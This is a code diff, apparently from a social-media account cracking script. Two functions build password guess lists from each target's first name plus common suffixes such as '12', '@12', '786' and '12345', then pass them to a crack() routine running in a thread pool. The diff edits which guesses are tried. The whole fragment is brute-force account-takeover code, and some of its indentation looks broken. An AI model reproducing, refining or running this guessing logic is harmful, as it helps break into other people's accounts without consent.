@@ -231,15 +231,15 @@ def first():
 					pass
 				else:
 					pwv.append(frs+'12')
-					pwv.append(frs+'123')
+					pwv.append(frs+'@12')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
+					pwv.append(frs+'@12')
+					pwv.append(frs+'@123')
 					pwv.append(frs+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
@@ -280,17 +280,7 @@ def name2():
 					pass
 				else:
 					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'786')
-                    pwv.append(frs+'420')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@12')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@1234')
-                    pwv.append(frs+'@12345')
+					pwv.append(frs+'@12')
                     
 			else:
 				if len(frs)<3:
@@ -298,17 +288,7 @@ def name2():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-                    pwv.append(frs+'786')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'420')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@12')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@1234')
-                    pwv.append(frs+'@12345')
+					pwv.append(frs+'@12')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
